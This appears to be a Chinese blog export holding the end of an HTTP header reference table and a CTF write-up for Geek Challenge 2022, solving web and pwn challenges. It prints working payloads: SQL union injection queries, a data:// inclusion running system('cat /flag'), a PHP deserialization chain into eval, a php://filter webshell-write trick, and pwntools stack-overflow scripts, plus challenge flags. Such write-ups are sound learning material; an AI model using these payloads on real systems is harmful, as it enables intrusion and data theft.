<td>令客户端重定向至指定 URI；WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。</td>
</tr>
<tr>
<td>Proxy-Authenticate</td>
<td>代理服务器对客户端的认证信息； 代理服务器响应浏览器，要求其提供代理身份验证信息。</td>
</tr>
<tr>
<td>Public-Key-Pins</td>
<td>包含该Web 服务器用来进行加密的 public key （公钥）信息；</td>
</tr>
<tr>
<td>Public-Key-Pins-Report-Only</td>
<td>设置在公钥固定不匹配时，发送错误信息到report-uri；</td>
</tr>
<tr>
<td>Referrer-Policy</td>
<td>用来监管哪些访问来源信息 会在 Referer 中发送；</td>
</tr>
<tr>
<td>Server</td>
<td>HTTP 服务器的安装信息；WEB 服务器表明自己是什么软件及版本等信息。<br>  例如：Server：Apache/2.0.61 (Unix)</td>
</tr>
<tr>
<td>Set-Cookie</td>
<td>服务器端向客户端发送 cookie；</td>
</tr>
<tr>
<td>Strict-Transport-Security</td>
<td>它告诉浏览器只能通过HTTPS访问当前资源；</td>
</tr>
<tr>
<td>Timing-Allow-Origin</td>
<td>用于指定特定站点，以允许其访问Resource Timing API提供的相关信息；</td>
</tr>
<tr>
<td>Tk</td>
<td>显示了对相应请求的跟踪情况；</td>
</tr>
<tr>
<td>Vary</td>
<td>服务器缓存的管理信息；WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为： Content-Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续       请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值       一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己     Cache 里面压缩后的实体响应给不具备解压能力的浏览器。       例如：Vary：Accept-Encoding</td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>定义了使用何种验证方式去获取对资源的连接；</td>
</tr>
<tr>
<td>X-XSS-Protection</td>
<td>当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面；</td>
</tr>
</tbody>
</table>
<h3 id="4-entity-headers">4、Entity Headers</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Allow</td>
<td>客户端可以处理的内容类型，这种内容类型用MIME类型来表示；</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>用于对特定媒体类型的数据进行压缩；WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。 <br>   例如：Content-Encoding：gzip</td>
</tr>
<tr>
<td>Content-Language</td>
<td>访问者希望采用的语言或语言组合；WEB 服务器告诉浏览器自己响应的对象的语言。</td>
</tr>
<tr>
<td>Content-Length</td>
<td>发送给接收方的消息主体的大小；WEB 服务器告诉浏览器自己响应的对象的长度。                例如：Content-Length: 26012</td>
</tr>
<tr>
<td>Content-Location</td>
<td>替代对应资源的 URI；</td>
</tr>
<tr>
<td>Content-Range</td>
<td>实体主体的位置范围；WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。                例如：Content-Range: bytes 21010-47021/47022</td>
</tr>
<tr>
<td>Content-Type</td>
<td>告诉客户端实际返回的内容的内容类型；WEB 服务器告诉浏览器自己响应的对象的类型。                例如：Content-Type：application/xml</td>
</tr>
<tr>
<td>Expired</td>
<td>包含日期/时间， 即在此时候之后，响应过期；WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。          是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</td>
</tr>
<tr>
<td>Last-Modified</td>
<td>资源的最后修改日期时间；WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。<br> 例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</td>
</tr>
</tbody>
</table>
<h4 id="content-type">Content-Type</h4>
<p>实体头部用于指示资源的 <a href="https://blog.csdn.net/m0_45406092/article/details/107384911">MIME类型</a> media type</p>
<ul>
<li>在响应中，Content-Type标头告诉客户端实际返回的内容的内容类型。浏览器会在某些情况下进行MIME查找，并不一定遵循此标题的值; 为了防止这种行为，可以将标题 X-Content-Type-Options 设置为 nosniff。</li>
<li>在请求中 (如POST 或 PUT)，客户端告诉服务器实际发送的数据类型。</li>
</ul>
<blockquote>
<p>浏览器会在某些情况下进行MIME查找，并不一定遵循此标题的值，简单来说，就是<code>Content-Type会被传入的实际类型替换</code>，比如请求设置的值是<code>text/plain</code>，但是传入json形式的字符串<code>&#123;‘name’:'tom','age':20&#125;</code>，那么最终值仍然为<code>application/json</code></p>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>HTTP头部信息分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Geek Challenge 2022</title>
    <url>/2022/11/21/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982022/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212356236.png?x-oss-process=hzy" alt="image-20221121235649120"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>成都信息工程大学的比赛，为其七天，来打打学习一下</p>
<h1 id="web">WEB</h1>
<h2 id="can-can-need">Can Can Need</h2>
<p>就是考察报文头，这个考察的比较细点</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151351302.png?x-oss-process=hzy" alt="image-20221115135122163"></p>
<p>SYC{E3sy_Http_hhXD2333}</p>
<p>这个文章说了所有的报文都是代表的啥意思</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/105775452">(77条消息) CTF-WEB——HTTP Headers类型_WHOAMIAnony的博客-CSDN博客_ctf header</a></p>
<h2 id="l0vesyc">L0veSyc</h2>
<p>签到题</p>
<p>SYC{We1c0me_t0_Geek_2022!}</p>
<h2 id="来发个包">来发个包</h2>
<blockquote>
<p>hint: vanzy写了个拿flag的接口，但是好像有东西忘记改了</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151356858.png?x-oss-process=hzy" alt="image-20221115135655803"></p>
<p>看源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151357902.png?x-oss-process=hzy" alt="image-20221115135718843"></p>
<p>根据提供的接口直接构造，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211162128087.png?x-oss-process=hzy" alt="image-20221116212811002"></p>
<p>SYC{:D_y0u_has_known_how_to_construct_a_requests_by_yourself}</p>
<h2 id="justphp">justphp</h2>
<p>题目源码如下</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
include_once (&quot;flag.php&quot;);
highlight_file(__FILE__);
$sleeptime=$_GET[&#x27;SleepTime&#x27;];
if(isset($sleeptime))
&#123;
    if(!is_numeric($sleeptime))
    &#123;
        echo &#x27;时间是一个数字啊喂！&#x27;;
    &#125;
    else if($sleeptime &lt; 86400 * 30)
    &#123;
        echo &#x27;这点时间哪够Canzik学长睡啊&#x27;;
    &#125;
    else if($sleeptime &gt; 86400 * 60)
    &#123;
        echo &#x27;别让Canzik学长睡死在这啊！&#x27;;
    &#125;
    else
    &#123;
        echo &#x27;&lt;br/&gt;Canzik学长很满足,表示这次把这辈子的觉都睡完啦！flag在这,自己拿吧:&lt;br/&gt;&#x27;;
        sleep((int)$sleeptime);
        echo $flag;
    &#125;
&#125;
?&gt; 时间是一个数字啊喂！</code></pre>
<p>如果按照常理的话应该SleepTime在两个值之间，还得是数字，然后就会跳到最后一个else，但是sleep，显然不行</p>
<p>正确解法is_numeric和sleep两个函数的绕过</p>
<blockquote>
<p>is_numeric() 函数用于检测变量是否为数字或数字字符串。若是则为true,否则为false</p>
</blockquote>
<p>sleep函数可以使用科学计数法绕过</p>
<blockquote>
<p>构造一个time=0.3e07（等价于0.3乘10的7次方）的参数，当它强制转化为零的时候就会变成零，这样可以满足条件</p>
</blockquote>
<p>is_numeric函数用0.3e07的数绕过</p>
<blockquote>
<p>进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足0e\d+这种模式就不会相等</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211160037089.png?x-oss-process=hzy" alt="image-20221116003719017"></p>
<p><code>SYC&#123;C@nzik#lik3s_to#sleeP_in_class?*#&#125;</code></p>
<h2 id="登陆试试">登陆试试</h2>
<blockquote>
<p>hint: Syclover用户忘了他的密码，咋办哦,依稀记得密码为6位数字,以774开头，这次我们来爆爆他的密码，让他再也不犯相同的错了</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151421066.png?x-oss-process=hzy" alt="image-20221115142122917"></p>
<p>就是个单纯爆破，字典密码用md5加密爆破774000-774999</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211162123296.png?x-oss-process=hzy" alt="image-20221116212347212"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211162124430.png?x-oss-process=hzy" alt="image-20221116212407356"></p>
<p>SYC{xi_huan_4_l}</p>
<h2 id="welcomesql">WelcomeSQL</h2>
<blockquote>
<p>hint: 你能找到admin的秘密吗？</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151428549.png?x-oss-process=hzy" alt="image-20221115142857403"></p>
<p>判断出来是GET注入+数字型</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151433681.png?x-oss-process=hzy" alt="image-20221115143326585"></p>
<p>id到5就没了，说明字段是4</p>
<p>使用联合注入</p>
<pre><code class="hljs plaintext">-1 union select 1,2</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151434125.png?x-oss-process=hzy" alt="image-20221115143444018"></p>
<p>3就报错了，接下来继续查询获取当前数据名</p>
<pre><code class="hljs plaintext">-1 union select 1,database()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151437028.png?x-oss-process=hzy" alt="image-20221115143700917"></p>
<p>获取所有数据库名</p>
<pre><code class="hljs plaintext">-1 union select 1,group_concat(schema_name)from information_schema.schemata</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151442865.png?x-oss-process=hzy" alt="image-20221115144201730"></p>
<p>获取WelcomeSQL数据库的表名</p>
<pre><code class="hljs plaintext">d=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;WelcomeSQL&#x27;
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151440089.png?x-oss-process=hzy" alt="image-20221115144004948"></p>
<p>没看到flag，查mysql表名</p>
<p>着实没查到，再回到WelcomeSQL看看，查询user_info所有字段名</p>
<pre><code class="hljs plaintext">union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;WelcomeSQL&#x27; and table_name=&#x27;user_info&#x27;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151445787.png?x-oss-process=hzy" alt="image-20221115144547638"></p>
<p>看到了secret，查询</p>
<pre><code class="hljs plaintext">union select 1,group_concat(secret) from WelcomeSQL.user_info</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151449871.png?x-oss-process=hzy" alt="image-20221115144921737"></p>
<p>找到flag</p>
<p>SYC{VV31c0me_T0_5QL1_vv01rd_!}</p>
<h2 id="jsfind">jsfind</h2>
<blockquote>
<p>hint: 游戏玩不了的话请使用chrome试试;你知道如何在js文件中找出敏感路径吗？</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151453731.png?x-oss-process=hzy" alt="image-20221115145318668"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151453608.png?x-oss-process=hzy" alt="image-20221115145342528"></p>
<p>base64–&gt;JJEncode得到flag</p>
<p>SYC{D@y0u_LiKKe_D3code_EnCodE}</p>
<h2 id="ezr_f_i">ezR_F_I</h2>
<blockquote>
<p>hint: 想要得到flag就快来包含一下叭 可能你需要一台具有公网ip的服务器</p>
</blockquote>
<p>这个hint说明需要远程文件包含了</p>
<p>这个貌似http://会被过滤掉,后面也会加个.html，闹心</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151507056.png?x-oss-process=hzy" alt="image-20221115150706995"></p>
<pre><code class="hljs plaintext">?file=data:text/plain,&lt;?php%20system(%27cat%20/flag%27);;?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211171447435.png?x-oss-process=hzy" alt="image-20221117144754334"></p>
<p>SYC{Th1s_is_RFI_hahaha!}</p>
<h2 id="babyupload">babyupload</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151508086.png?x-oss-process=hzy" alt="image-20221115150817035"></p>
<p>传一句话，直接传上去了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151509532.png?x-oss-process=hzy" alt="image-20221115150909429"></p>
<p>SYC{welc0me_t0_up10ad_wor1d!}</p>
<h2 id="ezrce">ezrce</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151510247.png?x-oss-process=hzy" alt="image-20221115151022134"></p>
<p>与佛论禅解出来注释如下</p>
<pre><code class="hljs plaintext">我都懂，我都明白，我是没有策略的防火墙，是被无限绕过的WAF，是扫不出马的EDR，是丢流量的探针，是没升级的态势感知，我守不住内网，也守不住你。#flag或许会在当前目录#</code></pre>
<p>根目录被过滤了，提示又说在当前目录，tac没有被过滤，但是但是不知道为啥tac不出来</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151524817.png?x-oss-process=hzy" alt="image-20221115152424703"></p>
<p>使用拆分命令绕过</p>
<pre><code class="hljs plaintext">a=l;b=s;$a$b</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211160029506.png?x-oss-process=hzy" alt="image-20221116002923057"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211160031398.png?x-oss-process=hzy" alt="image-20221116003103309"></p>
<p>SYC{y0u_n33d_a_g1rfr1nd}</p>
<h2 id="easyphp">easyphp</h2>
<p>注释说明有备份文件，扫目录，下载备份文件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151533708.png?x-oss-process=hzy" alt="image-20221115153322623"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151534612.png?x-oss-process=hzy" alt="image-20221115153452544"></p>
<p>发现这是个简单混淆类加密，也就是直接用就行</p>
<p><a href="https://www.toolnb.com/tools/phpcarbylamine.html">https://www.toolnb.com/tools/phpcarbylamine.html</a></p>
<p>解密之后如下</p>
<pre><code class="hljs plaintext">&lt;?php
class BillyHerrington
&#123;
        public $a;

        public function __wakeup()
        &#123;
                $this -&gt; a = &quot;fxxk you &quot;;
        &#125;

        public function __destruct()
        &#123;
                echo $this -&gt; a.&quot;Wow&quot;;
        &#125;
&#125;

class Baoglady&#123;
        public $b;
        public $c;

        public function __toString()
        &#123;
                $this -&gt; b -&gt; happy($this -&gt; c);
        &#125;
&#125;

class VanDarkholme&#123;
        public $d;

        public function happy($cmd)&#123;
                eval($cmd);
        &#125;
&#125;

if(isset($_POST[&#x27;str&#x27;]))&#123;
        unserialize($_POST[&#x27;str&#x27;]);
&#125;
</code></pre>
<p>原来，原来是反序列化</p>
<pre><code class="hljs plaintext">&lt;?php
class BillyHerrington
&#123;
    public $a;
    public function __construct()&#123;
        $this-&gt;a = new Baoglady();
    &#125;
    public function __wakeup() 
    &#123;
        $this-&gt;a = &quot;fxxk you &quot;;
    &#125;

    public function __destruct()
    &#123;
        echo $this-&gt;a.&quot;Wow&quot;;
    &#125;
&#125;

class Baoglady
&#123;
    public $b;
    public $c;
    public function __construct()&#123;
        $this-&gt;b = new VanDarkholme();
        $this-&gt;c = &quot;system(&#x27;whoami&#x27;);&quot;;
    &#125;

    public function __toString()
    &#123;
        $this-&gt;b-&gt;happy($this-&gt;c);
    &#125;
&#125;

class VanDarkholme
&#123;
    public $d;

    public function happy($cmd)
    &#123;
        eval($cmd);
    &#125;
&#125;
$payload = new BillyHerrington();
echo serialize($payload);</code></pre>
<pre><code class="hljs plaintext">O:15:&quot;BillyHerrington&quot;:5:&#123;s:1:&quot;a&quot;;O:8:&quot;Baoglady&quot;:2:&#123;s:1:&quot;b&quot;;O:12:&quot;VanDarkholme&quot;:1:&#123;s:1:&quot;d&quot;;N;&#125;s:1:&quot;c&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212132381.png?x-oss-process=hzy" alt="image-20221121213209267"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212132327.png?x-oss-process=hzy" alt="image-20221121213244231"></p>
<p>SYC{XD_why_php_s0_1nter3sting}</p>
<h2 id="uploadrce">uploadrce</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161806459.png?x-oss-process=hzy" alt="image-20221116180611010"></p>
<p>备份文件先扫一下目录</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161807194.png?x-oss-process=hzy" alt="image-20221116180725100"></p>
<p>第一个备份文件是config.php的备份文件，内容如下</p>
<pre><code class="hljs plaintext">   $$option=&#x27;chinfo&#x27;; &lt;?php 
   
   &lt;?php 
$option=&#x27;chinfo&#x27;;</code></pre>
<p>第二个备份文件内容如下</p>
<pre><code class="hljs plaintext">ffile_put_contents(&#x27;./config.php&#x27;, $file); $file = preg_replace(&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;, &quot;\$option=&#x27;$str&#x27;;&quot;, $file); $file = file_get_contents(&#x27;./config.php&#x27;);     &#125;       echo &#x27;:Where is the source code of config.php?&#x27;; if($str != NULL)&#123;  $str = addslashes($_GET[&#x27;option&#x27;]); if(!isset($_GET[&#x27;option&#x27;])) die(); &lt;?php</code></pre>
<p>整理一下如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161913269.png?x-oss-process=hzy" alt="image-20221116191303152"></p>
<p>正则匹配绕过</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211162029989.png?x-oss-process=hzy" alt="image-20221116202947921"></p>
<p>这个时候再get传一下chinfo就会把\正则匹配替换掉</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161809298.png?x-oss-process=hzy" alt="image-20221116180918207"></p>
<p>phpinfo了，但是没找到flag，看来得shell才行</p>
<p>通过这两个泄露的源码本地起个环境试试，发现可以写马</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161945659.png?x-oss-process=hzy" alt="image-20221116194525577"></p>
<p>写马之前和写马之后config.php的内容变化</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161946516.png?x-oss-process=hzy" alt="image-20221116194602468"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161946009.png?x-oss-process=hzy" alt="image-20221116194619952"></p>
<p>正则，所以再get一下初始值，\就被正则替换掉了，马就出来了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161947433.png?x-oss-process=hzy" alt="image-20221116194702381"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211161947349.png?x-oss-process=hzy" alt="image-20221116194752278"></p>
<p>远程这样打发现还是不行，后来发现是url编码问题，只需要把马编码之后再传进去就可以了，其他思路和刚才都一样</p>
<blockquote>
<p>[]和$编码都有问题</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211162102798.png?x-oss-process=hzy" alt="image-20221116210223836"></p>
<p>SYC{y0u_c@n_RCEME_n0w!}</p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/weixin_30888707/article/details/94925910?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-94925910-blog-101026548.pc_relevant_3mothn_strategy_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-94925910-blog-101026548.pc_relevant_3mothn_strategy_recovery&amp;utm_relevant_index=1">https://blog.csdn.net/weixin_30888707/article/details/94925910?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-94925910-blog-101026548.pc_relevant_3mothn_strategy_recovery&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-94925910-blog-101026548.pc_relevant_3mothn_strategy_recovery&amp;utm_relevant_index=1</a></p>
<h2 id="not_stay">Not_Stay</h2>
<blockquote>
<p>hint: stay,don’t exitt</p>
</blockquote>
<p>文件上传题目，源码如下</p>
<pre><code class="hljs plaintext">I need dataI need name &lt;?php
//简单的实现文件头检测
include_once(&#x27;waf.php&#x27;);
function  uuid()  
&#123;  
    $chars = md5(uniqid(mt_rand(), true));  
    $uuid = substr ( $chars, 0, 8 ) . &#x27;-&#x27;
            . substr ( $chars, 8, 4 ) . &#x27;-&#x27; 
            . substr ( $chars, 12, 4 ) . &#x27;-&#x27;
            . substr ( $chars, 16, 4 ) . &#x27;-&#x27;
            . substr ( $chars, 20, 12 );  
    return $uuid ;  
&#125;  
$safe_header = &#x27;&lt;?php exit();?&gt;&#x27;;
if(!isset($_COOKIE[&#x27;path&#x27;]))&#123;
    setcookie(&#x27;path&#x27;,uuid());
    exit();
&#125;
$path = &#x27;./upload/&#x27;.$_COOKIE[&#x27;path&#x27;].&#x27;/&#x27;;
if(!is_dir($path))&#123;
    mkdir($path);
    chmod($path,0755);
&#125;
$file_data = $_POST[&#x27;data&#x27;];
$filename = $_POST[&#x27;filename&#x27;];
if(isset($_POST[&#x27;data&#x27;]))&#123;
    file_put_contents(&#x27;/tmp/&#x27;.$_COOKIE[&#x27;path&#x27;],$file_data);
    $file_type = exif_imagetype(&#x27;/tmp/&#x27;.$_COOKIE[&#x27;path&#x27;]);
    if($file_type != &quot;GIF&quot; &amp;&amp; $file_type != &quot;PNG&quot;)&#123;
        die(&#x27;nonono&#x27;);
    &#125;
&#125;else&#123;
    echo &quot;I need data&quot;;
&#125;
if(isset($_POST[&#x27;filename&#x27;]))&#123;
    file_put_contents($filename,$safe_header.$file_data);
&#125; else &#123;
    echo &quot;I need name&quot;;
&#125;
show_source(__FILE__);
?&gt;</code></pre>
<p>首先是文件头检测，这个只需要带上GIF89a就能绕过</p>
<p>第二步就是死亡绕过，exit()，绕过方法就是通过php://filter的base64-decode将死亡函数变成phpexit</p>
<blockquote>
<p>base64是八位一组解码，所以需要补齐</p>
</blockquote>
<p>构造base64</p>
<blockquote>
<p><em>base64_encode(“<?php echo system("ls /");?>”);</em></p>
<p>PD9waHAgZWNobyBzeXN0ZW0oImxzIC8iKTs/Pg==</p>
</blockquote>
<p>data=GIF89aaaaPD9waHAgZWNobyBzeXN0ZW0oImxzIC8iKTs/Pg==&amp;filename=php://filter/write=convert.base64-decode/resource=./upload/huang/1.php</p>
<p>摆了，传不上去</p>
<h2 id="drinktea">drinktea</h2>
<blockquote>
<p>hint: an4er说想吃双皮奶，你能帮帮他吗？环境每隔30分钟重置；你知道f4tb3e在syc的B站号上分享了什么吗</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212320250.png?x-oss-process=hzy" alt="image-20221121232046862"></p>
<p>首先先注册一个号登陆进去</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212321860.png?x-oss-process=hzy" alt="image-20221121232126550"></p>
<p>反馈页面看到hint</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212322679.png?x-oss-process=hzy" alt="image-20221121232251577"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212323436.png?x-oss-process=hzy" alt="image-20221121232324381"></p>
<pre><code class="hljs plaintext">
&lt;!-- 其实这个反馈界面还在调试阶段捏，我前几天上班摸鱼了…… --&gt;
&lt;?php
//真的随机吗？
$seed = file_get_contents(&quot;/seed&quot;);

mt_srand($seed);
mt_rand();//   == 1567320364
mt_rand();
mt_rand();
mt_rand();
mt_rand();
mt_rand();
$code = md5(mt_rand());
echo file_get_contents(&quot;random.php&quot;);
?&gt;</code></pre>
<p>爆破种子得到666666</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212325811.png?x-oss-process=hzy" alt="image-20221121232531696"></p>
<pre><code class="hljs plaintext">
&lt;?php
//真的随机吗？
//$seed = file_get_contents(&quot;/seed&quot;);
$seed=666666;
mt_srand($seed);
mt_rand();//   == 1567320364
mt_rand();
mt_rand();
mt_rand();
mt_rand();
mt_rand();
$code = md5(mt_rand());
echo $code;
//echo file_get_contents(&quot;random.php&quot;);
?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212328191.png?x-oss-process=hzy" alt="image-20221121232855105"></p>
<p>得到code=2bfd7154e1f327a42dae866bac9ecd45</p>
<p>主页源码也有个hint</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212330756.png?x-oss-process=hzy" alt="image-20221121233012602"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212330307.png?x-oss-process=hzy" alt="image-20221121233027136"></p>
<p>把那个上面的code反馈提交</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211212336570.png?x-oss-process=hzy" alt="image-20221121233610418"></p>
<p>然后就卡着了</p>
<h1 id="pwn">PWN</h1>
<h2 id="nc">NC</h2>
<p>签到</p>
<p>SYC{n0w_d0~y0u-know_wh@7-1$_n&lt;_w#47-15-pwn}</p>
<h2 id="pwn1_1">pwn1_1</h2>
<p>基础栈溢出</p>
<p>有backdoor</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151555492.png?x-oss-process=hzy" alt="image-20221115155537426"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151604248.png?x-oss-process=hzy" alt="image-20221115160408177"></p>
<pre><code class="hljs plaintext">from pwn import *
context.log_level=&quot;debug&quot;
#p = process(&quot;./pwn1_1&quot;)
p = remote(&#x27;gxh191.top&#x27;,25544)
payload = b&#x27;a&#x27;*24 +p64(0X401196)
p.sendline(payload)
p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211151605327.png?x-oss-process=hzy" alt="image-20221115160520246"></p>
<p>SYC{w3l[oMe-70-yovr_8a[Kd0or_w0r1d~17-15-3a2y}</p>
<h2 id="pwn2_1">pwn2_1</h2>
<p>首先先是checksec</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211160106204.png?x-oss-process=hzy" alt="image-20221116010635098"></p>
<p>发现和第一个一样，而且也是有/bin/sh</p>
<p>只不过看main函数的时候发现多了一个长度限制</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211160107204.png?x-oss-process=hzy" alt="image-20221116010708138"></p>
<p>其他都和第一个栈溢出一样，所以这道题目的思路无非就是多了个长度绕过，主函数main中read后的if判断，read函数可以读取16个字符，但if条件中只允许字符长度为9，因此，可通过在payload中间的位置填充0x00，使得strlen函数截断，虽然read函数超过了9个字节，但strlen的返回值仍然不大于9</p>
<p>接下来gdb动态调试</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211160114389.png?x-oss-process=hzy" alt="image-20221116011429302"></p>
<p>单步n，一直到read的位置，这是堆栈空间还没有被污染的样子，main函数执行完后，会从堆栈中弹出下一条指令的地址（这是main返回后要去的地方）</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211160116991.png?x-oss-process=hzy" alt="image-20221116011654924"></p>
<p>箭头指的地方就是即将要跳转到的地址</p>
<pre><code class="hljs plaintext">from pwn import *
context.log_level = &quot;debug&quot;
#r = process(&#x27;./pwn2_1&#x27;)
r = remote(&#x27;gxh191.top&#x27;,25540)

shell_addr = 0x4011EF
payload = b&#x27;\x00&#x27; * 0x18 + p64(shell_addr)
# 只要buf在前16字节有\x00就可以绕过strlen
# payload = &#x27;a&#x27;*0x07+&#x27;\x00&#x27;+&#x27;a&#x27;*0x10 + p64(shell_addr)

r.recvuntil(&#x27;This is your second pwn challenge ;)\n&#x27;)
r.sendline(payload)
r.interactive()

</code></pre>
<p>SYC{enj0y_8@ckd0or_3njoy_1iF3-3nj0y_3Veryth1n9}</p>
<p>参考：</p>
<p>[(77条消息) <a href="https://blog.csdn.net/weixin_43363675/article/details/117438963">NTUSTISC pwn LAB 2]栈溢出：gdb动态调试bof2_漫小牛的博客-CSDN博客</a></p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="ez_classic">ez_classic</h2>
